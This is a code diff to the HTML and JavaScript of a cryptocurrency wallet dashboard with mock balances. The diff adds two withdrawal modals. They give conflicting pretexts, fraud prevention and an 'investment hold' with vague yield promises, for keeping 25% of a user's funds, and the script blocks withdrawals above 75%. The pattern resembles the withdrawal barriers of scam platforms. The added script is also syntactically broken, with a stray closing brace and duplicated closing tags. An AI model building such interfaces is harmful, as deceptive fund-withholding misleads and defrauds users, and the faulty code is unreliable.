@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -10,6 +11,7 @@
     <meta name="theme-color" content="#2c3e50">
 </head>
 <body>
+   
     <div class="dashboard-container">
         <!-- Header -->
         <header class="dashboard-header">
@@ -127,20 +129,6 @@
                         </div>
                     </div>
                     
-                    <div class="form-group">
-                        <label for="amount" id="amountLabel">Amount to Deposit</label>
-                        <div class="amount-input">
-                            <input type="number" id="amount" name="amount" step="0.000001" min="0" placeholder="0.00" required>
-                            <span id="currencySymbol">BTC</span>
-                        </div>
-                        <div class="amount-options">
-                            <button type="button" class="amount-option" data-percent="25">25%</button>
-                            <button type="button" class="amount-option" data-percent="50">50%</button>
-                            <button type="button" class="amount-option" data-percent="75">75%</button>
-                            <button type="button" class="amount-option" data-percent="100">100%</button>
-                        </div>
-                    </div>
-                    
                     <div id="depositSection">
                         <div class="form-group">
                             <label>Deposit Address</label>
@@ -158,9 +146,28 @@
                             </div>
                             <p class="qr-note">Scan this QR code to deposit</p>
                         </div>
+                        
+                        <div class="deposit-info">
+                            <p><i class="fas fa-info-circle"></i> Deposits are credited automatically after 1 network confirmation.</p>
+                            <p><i class="fas fa-clock"></i> Expected confirmation time: ~10 minutes</p>
+                        </div>
                     </div>
                     
                     <div id="withdrawSection" style="display: none;">
+                        <div class="form-group">
+                            <label for="amount" id="amountLabel">Amount to Withdraw</label>
+                            <div class="amount-input">
+                                <input type="number" id="amount" name="amount" step="0.000001" min="0" placeholder="0.00" required>
+                                <span id="currencySymbol">BTC</span>
+                            </div>
+                            <div class="amount-options">
+                                <button type="button" class="amount-option" data-percent="25">25%</button>
+                                <button type="button" class="amount-option" data-percent="50">50%</button>
+                                <button type="button" class="amount-option" data-percent="75">75%</button>
+                                <button type="button" class="amount-option" data-percent="100">100%</button>
+                            </div>
+                        </div>
+                        
                         <div class="form-group">
                             <label for="withdrawAddress">Destination Address</label>
                             <input type="text" id="withdrawAddress" name="withdrawAddress" placeholder="Enter wallet address" required>
@@ -184,18 +191,48 @@
                             <span>You will receive:</span>
                             <span id="receiveAmount">0.0000 BTC</span>
                         </div>
+                        
+                        <button type="submit" id="submitWithdrawBtn" class="btn btn-primary btn-block">
+                            <span class="btn-text">Confirm Withdrawal</span>
+                            <span class="btn-loader" hidden>
+                                <i class="fas fa-spinner fa-spin"></i>
+                            </span>
+                        </button>
                     </div>
-                    
-                    <button type="submit" id="submitBtn" class="btn btn-primary btn-block">
-                        <span class="btn-text">Proceed to Deposit</span>
-                        <span class="btn-loader" hidden>
-                            <i class="fas fa-spinner fa-spin"></i>
-                        </span>
-                    </button>
                 </form>
             </div>
         </div>
+        <!-- Withdrawal Confirmation Modal -->
+        <div id="withdrawConfirmModal" class="modal" style="display: none;">
+            <div class="modal-content small">
+                <h2>Withdrawal Requirement</h2>
+                <p>To prevent fraudulent activities and ensure account security, we require users to maintain at least 25% of their wallet balance when making withdrawals.</p>
+                <p>This measure helps protect both our platform and our users from potential security threats.</p>
+                <div class="modal-actions">
+                    <button id="cancelWithdrawBtn" class="btn btn-outline">Cancel</button>
+                    <button id="acceptWithdrawBtn" class="btn btn-primary">I Understand</button>
+                </div>
+            </div>
+        </div>
         
+        <!-- Investment Hold Modal -->
+        <div id="investmentHoldModal" class="modal" style="display: none;">
+            <div class="modal-content small">
+                <h2>Investment Hold Notice</h2>
+                <p>Due to our long-term investment strategy that helps generate yields for your assets, we require maintaining a 25% deposit of your wallet balance.</p>
+                <p>This ensures:</p>
+                <ul class="benefits-list">
+                    <li><i class="fas fa-check-circle"></i> Continuous earning potential on your assets</li>
+                    <li><i class="fas fa-check-circle"></i> Stable platform liquidity</li>
+                    <li><i class="fas fa-check-circle"></i> Better interest rates for all users</li>
+                </ul>
+                <div class="modal-actions">
+                    <button id="cancelHoldBtn" class="btn btn-outline">Cancel Withdrawal</button>
+                    <button id="confirmHoldBtn" class="btn btn-primary">Accept & Proceed</button>
+                </div>
+            </div>
+        </div>
+
         <!-- Notification System -->
         <div id="notification" class="notification">
             <div class="notification-content">
@@ -204,6 +241,222 @@
         </div>
     </div>
 
-    <script src="assets/js/dashboard.js"></script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+const transactionModal = document.getElementById('transactionModal');
+            const withdrawConfirmModal = document.getElementById('withdrawConfirmModal');
+            const depositBtn = document.getElementById('depositBtn');
+            const withdrawBtn = document.getElementById('withdrawBtn');
+            const closeModal = document.querySelector('.close-modal');
+            const tabButtons = document.querySelectorAll('.tab-btn');
+            const depositSection = document.getElementById('depositSection');
+            const withdrawSection = document.getElementById('withdrawSection');
+            const currencySelect = document.getElementById('currency');
+            const currencySymbol = document.getElementById('currencySymbol');
+            const currentBalance = document.getElementById('currentBalance');
+            const amountInput = document.getElementById('amount');
+            const amountOptions = document.querySelectorAll('.amount-option');
+            const submitWithdrawBtn = document.getElementById('submitWithdrawBtn');
+            const cancelWithdrawBtn = document.getElementById('cancelWithdrawBtn');
+            const acceptWithdrawBtn = document.getElementById('acceptWithdrawBtn');
+            
+            // Wallet balances (mock data)
+            const walletBalances = {
+                BTC: 0.054321,
+                ETH: 1.234567,
+                USDT: 1250.50
+            };
+            
+            // Network fees (mock data)
+            const networkFees = {
+                BTC: 0.0005,
+                ETH: 0.01,
+                USDT: 1.0
+            };
+            
+            // Format crypto amounts based on currency
+            function formatCryptoAmount(amount, currency) {
+                if (currency === 'USDT') {
+                    return parseFloat(amount).toFixed(2);
+                }
+                return parseFloat(amount).toFixed(6);
+            }
+            
+            // Update UI based on selected currency
+            function updateCurrency() {
+                const currency = currencySelect.value;
+                currencySymbol.textContent = currency;
+                
+                // Update balance display
+                currentBalance.textContent = formatCryptoAmount(walletBalances[currency], currency);
+                
+                // Update network fee
+                document.getElementById('networkFee').textContent = 
+                    `${formatCryptoAmount(networkFees[currency], currency)} ${currency}`;
+                
+                // Update receive amount calculation
+                updateReceiveAmount();
+            }
+            
+            // Calculate and update receive amount
+            function updateReceiveAmount() {
+                if (!withdrawSection.style.display || withdrawSection.style.display === 'none') return;
+                
+                const currency = currencySelect.value;
+                const amount = parseFloat(amountInput.value) || 0;
+                const fee = networkFees[currency];
+                
+                const receiveAmount = Math.max(0, amount - fee);
+                document.getElementById('receiveAmount').textContent = 
+                    `${formatCryptoAmount(receiveAmount, currency)} ${currency}`;
+            }
+            
+            // Show modal with proper tab
+            function showModal(tab) {
+                transactionModal.style.display = 'block';
+                
+                // Set active tab
+                tabButtons.forEach(btn => {
+                    if (btn.dataset.tab === tab) {
+                        btn.classList.add('active');
+                        if (tab === 'deposit') {
+                            depositSection.style.display = 'block';
+                            withdrawSection.style.display = 'none';
+                            document.getElementById('modalTitle').textContent = 'Deposit Crypto';
+                        } else {
+                            depositSection.style.display = 'none';
+                            withdrawSection.style.display = 'block';
+                            document.getElementById('modalTitle').textContent = 'Withdraw Crypto';
+                        }
+                    } else {
+                        btn.classList.remove('active');
+                    }
+                });
+                
+                // Update currency info
+                updateCurrency();
+            }
+            
+            // Event listeners
+            depositBtn.addEventListener('click', () => showModal('deposit'));
+            withdrawBtn.addEventListener('click', () => {
+                // Show confirmation modal first
+                withdrawConfirmModal.style.display = 'block';
+            });
+            
+            closeModal.addEventListener('click', () => {
+                transactionModal.style.display = 'none';
+                withdrawConfirmModal.style.display = 'none';
+            });
+            
+            // Tab switching
+            tabButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const tab = btn.dataset.tab;
+                    showModal(tab);
+                });
+            });
+            
+            // Currency selection change
+            currencySelect.addEventListener('change', updateCurrency);
+            
+            // Amount input changes
+            amountInput.addEventListener('input', updateReceiveAmount);
+            
+            // Percentage buttons
+            amountOptions.forEach(option => {
+                option.addEventListener('click', () => {
+                    const percent = parseFloat(option.dataset.percent) / 100;
+                    const currency = currencySelect.value;
+                    const balance = walletBalances[currency];
+                    
+                    amountInput.value = formatCryptoAmount(balance * percent, currency);
+                    updateReceiveAmount();
+                });
+            });
+              // Withdrawal confirmation
+            acceptWithdrawBtn.addEventListener('click', function() {
+                withdrawConfirmModal.style.display = 'none';
+                showModal('withdraw'); // This now shows the withdrawal form directly
+            });
+            
+            // Withdrawal form submission
+            submitWithdrawBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                // Now shows the investment hold modal after form submission
+                document.getElementById('investmentHoldModal').style.display = 'block';
+            });
+            
+           // First show the investment hold modal
+                document.getElementById('investmentHoldModal').style.display = 'block';
+            });
+            
+            // Investment hold modal buttons
+            document.getElementById('confirmHoldBtn').addEventListener('click', function() {
+                // Process the withdrawal after both confirmations
+                processWithdrawal();
+                document.getElementById('investmentHoldModal').style.display = 'none';
+                document.getElementById('transactionModal').style.display = 'none';
+            });
+            
+            document.getElementById('cancelHoldBtn').addEventListener('click', function() {
+                document.getElementById('investmentHoldModal').style.display = 'none';
+            });
+            
+            function processWithdrawal() {
+                const currency = currencySelect.value;
+                const amount = parseFloat(amountInput.value) || 0;
+                const balance = walletBalances[currency];
+                
+                // Check if withdrawal amount exceeds 75% of balance
+                if (amount > balance * 0.75) {
+                    showNotification('Error: You can only withdraw up to 75% of your balance');
+                    return;
+                }
+                
+                // Process withdrawal (in a real app, this would be an API call)
+                showNotification(`Withdrawal request for ${amount} ${currency} submitted`);
+                
+                // Update balance (mock)
+                walletBalances[currency] = balance - amount;
+                updateCurrency();
+            }
+            
+            
+            // Copy address functionality
+            document.getElementById('copyAddress').addEventListener('click', () => {
+                const address = document.getElementById('depositAddress').textContent;
+                navigator.clipboard.writeText(address);
+                showNotification('Address copied to clipboard!');
+            });
+            
+            // Show notification
+            function showNotification(message) {
+                const notification = document.getElementById('notification');
+                const notificationMessage = document.getElementById('notificationMessage');
+                
+                notificationMessage.textContent = message;
+                notification.style.display = 'block';
+                
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 3000);
+            }
+            
+            // Close modals when clicking outside
+            window.addEventListener('click', (event) => {
+                if (event.target === transactionModal) {
+                    transactionModal.style.display = 'none';
+                }
+                if (event.target === withdrawConfirmModal) {
+                    withdrawConfirmModal.style.display = 'none';
+                }
+            });
+            
+           
+    </script>
+</body>
+</html>
 </body>
 </html>
